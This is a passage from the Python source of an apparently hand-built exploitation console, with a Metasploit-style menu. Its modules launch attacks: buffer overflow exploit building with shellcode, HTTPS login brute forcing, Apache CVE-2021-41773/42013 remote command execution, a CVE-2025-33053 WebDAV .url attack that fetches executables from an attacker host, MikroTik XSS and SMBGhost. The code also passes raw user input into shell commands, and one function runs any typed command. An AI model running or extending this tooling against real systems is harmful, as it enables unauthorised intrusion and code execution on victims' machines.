        time.sleep(0.5)
        Console()
    elif scconsole165 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def bufferoverflowfuzzerpattern():
    scconsole166 = input("sc~" + color.red + "(buffer_overflow/fuzzer_pattern)" + color.white + ">")
    if scconsole166 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        bufferoverflowfuzzerpattern()
    elif scconsole166 == "clear":
        os.system('clear')
        bufferoverflowfuzzerpattern()
    elif scconsole166 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify target ip address.
RPORT            | specify target vulnerable port(or open port).
PATTERN_LENGTH   | specify the pattern length(e.g., 3000).

you will specifiy these options when you run or exploit it!
""")
        bufferoverflowfuzzerpattern()
    elif scconsole166 == "run" or scconsole166 == "exploit":
        os.system('python exploits/buffer_overflow/fuzzer_pattern.py')
        bufferoverflowfuzzerpattern()
    elif scconsole166 == "unuse":
        print("unusing buffer_overflow/fuzzer_pattern.")
        time.sleep(0.5)
        Console()
    elif scconsole166 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def bufferoverflowfindoffsec():
    scconsole167 = input("sc~" + color.red + "(buffer_overflow/find_offsec)" + color.white + ">")
    if scconsole167 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        bufferoverflowfindoffsec()
    elif scconsole167 == "clear":
        os.system('clear')
        bufferoverflowfindoffsec()
    elif scconsole167 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
EIP_VALUE        | specify the eip value(e.g., 39694438).

you will specifiy these options when you run or exploit it!
""")
        bufferoverflowfindoffsec()
    elif scconsole167 == "run" or scconsole167 == "exploit":
        os.system('python exploits/buffer_overflow/find_offsec.py')
        bufferoverflowfindoffsec()
    elif scconsole167 == "unuse":
        print("unusing buffer_overflow/find_offsec.")
        time.sleep(0.5)
        Console()
    elif scconsole167 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def bufferoverflowbufferoverflowexploitbuilder():
    scconsole168 = input("sc~" + color.red + "(buffer_overflow/buffer_overflow_exploit_builder)" + color.white + ">")
    if scconsole168 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        bufferoverflowbufferoverflowexploitbuilder()
    elif scconsole168 == "clear":
        os.system('clear')
        bufferoverflowbufferoverflowexploitbuilder()
    elif scconsole168 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify target ip address.
RPORT            | specify target vulnerable port(or open port).
OFFSEC           | specify the offsec to eip.
JMP_ESP_ADDRESS  | specify the jmp esp address(little-endian, e.g., \\xaf\\x11\\x50\\x62).
SHELLCODE        | specify the shellcode(you can generate it with 'scshellcodegenerator').

you will specifiy these options when you run or exploit it!
""")
        bufferoverflowbufferoverflowexploitbuilder()
    elif scconsole168 == "run" or scconsole168 == "exploit":
        os.system('python exploits/buffer_overflow/buffer_overflow_exploit_builder.py')
        bufferoverflowbufferoverflowexploitbuilder()
    elif scconsole168 == "unuse":
        print("unusing buffer_overflow/buffer_overflow_exploit_builder.")
        time.sleep(0.5)
        Console()
    elif scconsole168 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def scannercsrftokendetect():
    scconsole169 = input("sc~" + color.red + "(scanner/csrf_token_detect)" + color.white + ">")
    if scconsole169 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannercsrftokendetect()
    elif scconsole169 == "clear":
        os.system('clear')
        scannercsrftokendetect()
    elif scconsole169 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify target form url.

you will specifiy these options when you run or exploit it!
""")
        scannercsrftokendetect()
    elif scconsole169 == "run" or scconsole169 == "exploit":
        os.system('python exploits/scanner/csrf_token_detect.py')
        scannercsrftokendetect()
    elif scconsole169 == "unuse":
        print("unusing scanner/csrf_token_detect.")
        time.sleep(0.5)
        Console()
    elif scconsole169 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def auxiliaryhttpsbruteforce():
    scconsole170 = input("sc~" + color.red + "(auxiliary/https_brute_force)" + color.white + ">")
    if scconsole170 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliaryhttpsbruteforce()
    elif scconsole170 == "clear":
        os.system('clear')
        auxiliaryhttpsbruteforce()
    elif scconsole170 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify login url.
USER_FIELD       | specify the username field name.
PASS_FIELD       | specify the password field name.
USERNAME         | specify the username for brute-force.
USERNAMELIST     | of specify the usernamelist.
PASSWORDLIST     | specify the passwordlist.
SUCCESS          | specify teh keyword that appears on successful login.

you will specifiy these options when you run or exploit it!
""")
        auxiliaryhttpsbruteforce()
    elif scconsole170 == "run" or scconsole170 == "exploit":
        os.system('python exploits/auxiliary/https_brute_force.py')
        auxiliaryhttpsbruteforce()
    elif scconsole170 == "unuse":
        print("unusing auxiliary/https_brute_force.")
        time.sleep(0.5)
        Console()
    elif scconsole170 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def windowswindowswebdavurlrcecve202533053():
    scconsole171 = input("sc~" + color.red + "(windows/windows_webdav_url_rce_cve_2025_33053)" + color.white + ">")
    if scconsole171 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        windowswindowswebdavurlrcecve202533053()
    elif scconsole171 == "clear":
        os.system('clear')
        windowswindowswebdavurlrcecve202533053()
    elif scconsole171 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
OUTPUT           | specify path for generated .url file.
BINARY           | specify trusted LOLBin to execute (default: iediagcmd.exe).
UNC              | specify UNC WebDAV path hosting malicious executables (e.g., //attacker.com/DavWWWRoot).

you will specifiy these options when you run or exploit it!
""")
        windowswindowswebdavurlrcecve202533053()
    elif scconsole171 == "run" or scconsole171 == "exploit":
        namefoutput = input("Path for generated .url file: ")
        binary = input("Trusted LOLBin to execute (default: iediagcmd.exe): ")
        unc = input("UNC WebDAV path hosting malicious executables (e.g., //attacker.com/DavWWWRoot): ")
        os.system(f'python exploits/windows/windows_webdav_url_rce_cve_2025_33053.py -o {namefoutput} -b {binary} -u {unc}')
        windowswindowswebdavurlrcecve202533053()
    elif scconsole171 == "unuse":
        print("unusing windows/windows_webdav_url_rce_cve_2025_33053.")
        time.sleep(0.5)
        Console()
    elif scconsole171 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def sitecve202141773apacherce():
    scconsole172 = input("sc~" + color.red + "(site/cve_2021_41773_apache_rce)" + color.white + ">")
    if scconsole172 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sitecve202141773apacherce()
    elif scconsole172 == "clear":
        os.system('clear')
        sitecve202141773apacherce()
    elif scconsole172 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify target vulnerable Apache HTTP Server (Version 2.4.49) url (example: http://192.268.1.1:80).
COMMAND          | specify the command to execute on target Apache server (example: whoami).

you will specifiy these options when you run or exploit it!
""")
        sitecve202141773apacherce()
    elif scconsole172 == "run" or scconsole172 == "exploit":
        targetapachev = input("Enter target vulnerable Apache HTTP Server URL (e.g.: http://192.168.1.1:80): ")
        commandtoapache = input("Enter command to execute in target server: ")
        os.system(f'python exploits/site/cve_2021_41773_apache_rce.py {targetapachev}')
        os.system(f'python exploits/site/cve_2021_41773_apache_rce.py {targetapachev} {commandtoapache}')
        sitecve202141773apacherce()
    elif scconsole172 == "unuse":
        print("unusing site/cve_2021_41773_apache_rce.")
        time.sleep(0.5)
        Console()
    elif scconsole172 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sitecve202142013apachebypassrce():
    scconsole173 = input("sc~" + color.red + "(site/cve_2021_42013_apache_bypass_rce)" + color.white + ">")
    if scconsole173 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sitecve202142013apachebypassrce()
    elif scconsole173 == "clear":
        os.system('clear')
        sitecve202142013apachebypassrce()
    elif scconsole173 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify target vulnerable Apache HTTP Server (Version 2.4.49) url (example: http://192.268.1.1:80).
COMMAND          | specify the command to execute on target Apache server (example: whoami).

you will specifiy these options when you run or exploit it!
""")
        sitecve202142013apachebypassrce()
    elif scconsole173 == "run" or scconsole173 == "exploit":
        targetapachev2 = input("Enter target vulnerable Apache HTTP Server URL (e.g.: http://192.168.1.1:80): ")
        commandtoapache2 = input("Enter command to execute in target server: ")
        os.system(f'python exploits/site/cve_2021_42013_apache_bypass_rce.py {targetapachev2} {commandtoapache2}')
        sitecve202142013apachebypassrce()
    elif scconsole173 == "unuse":
        print("unusing site/cve_2021_42013_apache_bypass_rce.")
        time.sleep(0.5)
        Console()
    elif scconsole173 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def auxiliarymikrotikrouteros7191xss():
    scconsole174 = input("sc~" + color.red + "(auxiliary/mikrotik-routeros-7-19-1-xss)" + color.white + ">")
    if scconsole174 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarymikrotikrouteros7191xss()
    elif scconsole174 == "clear":
        os.system('clear')
        auxiliarymikrotikrouteros7191xss()
    elif scconsole174 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target mikrotik ip address.
PAYLOAD          | specify the xss payload (example: javascript:alert(3) )

you will specifiy these options when you run or exploit it!
""")
        auxiliarymikrotikrouteros7191xss()
    elif scconsole174 == "run" or scconsole174 == "exploit":
        os.system('python exploits/auxiliary/mikrotik-routeros-7-19-1-xss.py')
        auxiliarymikrotikrouteros7191xss()
    elif scconsole174 == "unuse":
        print("unusing auxiliary/mikrotik-routeros-7-19-1-xss.")
        time.sleep(0.5)
        Console()
    elif scconsole174 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def sitefilelistwordpresspligun422():
    scconsole175 = input("sc~" + color.red + "(site/file_list_wordpress_pligun_4-2-2)" + color.white + ">")
    if scconsole175 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sitefilelistwordpresspligun422()
    elif scconsole175 == "clear":
        os.system('clear')
        sitefilelistwordpresspligun422()
    elif scconsole175 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOSTS           | specify the target list.txt (create a list.txt and put your taregts in that).

you will specifiy these options when you run or exploit it!
""")
        sitefilelistwordpresspligun422()
    elif scconsole175 == "run" or scconsole175 == "exploit":
        targetlist = input("Enter the name of the targets list (with .txt): ")
        os.system(f'python exploits/site/file_list_wordpress_pligun_4-2-2.py {targetlist}')
        sitefilelistwordpresspligun422()
    elif scconsole175 == "unuse":
        print("unusing site/file_list_wordpress_pligun_4-2-2.")
        time.sleep(0.5)
        Console()
    elif scconsole175 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()
        
def windowssmbghost():
    scconsole176 = input("sc~" + color.red + "(windows/smbghost)" + color.white + ">")
    if scconsole176 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        windowssmbghost()
    elif scconsole176 == "clear":
        os.system('clear')
        windowssmbghost()
    elif scconsole176 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify target ip address.
SHELLCODE        | after you generated your shellcode, paste into a .txt file, then give it to exploit.

you will specifiy these options when you run or exploit it!
""")
        windowssmbghost()
    elif scconsole176 == "run" or scconsole176 == "exploit":
        targetsmb = input("Enter target IP Address: ")
        shellcodefile = input("Specify the ShellCode file (example: shellcode.txt): ")
        os.system(f'python exploits/windows/smbghost.py {targetsmb} {shellcodefile}')
        windowssmbghost()
    elif scconsole176 == "unuse":
        print("unusing windows/smbghost.")
        time.sleep(0.5)
        Console()
    elif scconsole176 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def OSconsole():
    scconsole2 = input("sc-" + color.blue + "system" + color.white + "~>")
    os.system(scconsole2)
    if scconsole2 == "back to sc-console":
        Console()




def main():
    start()
    Menu()
    while True:
        Console()


if __name__ == "__main__":
    main()
